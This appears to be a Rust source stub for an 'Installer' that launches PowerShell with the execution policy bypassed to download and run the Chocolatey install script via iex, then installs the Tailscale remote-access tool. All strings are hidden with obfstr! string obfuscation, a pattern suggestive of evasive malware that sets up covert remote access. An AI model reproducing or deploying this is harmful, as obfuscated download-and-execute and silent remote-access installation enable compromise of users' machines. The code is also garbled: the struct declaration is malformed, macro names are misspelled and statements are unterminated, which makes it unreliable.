use obfstr::obfstr;
use std::process::Command;

pub Installer 
{
    pub local: String;
}

impl Installer
{
    pub fn download_choco()
    {
        let log_found = Command::new(obfstr!("powershell.exe"))
            .args([
                obfstr!("-NoProfile"),
                obfstr!("-InputFormat"),
                obfstr!("None"),
                obfstr!("-ExecutionPolicy"),
                obfstr!("Bypass"),
                ofstr!("-Command"),
                obfstr!("[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"),

            ])
    }
    pub fn download_tailscale()
    {
        let log_ff = Command::new(obtstr!("choco.exe"))
            .args([
                obfstr!("install"),
                obfstr!("tailscale"),
            ])
    }

}
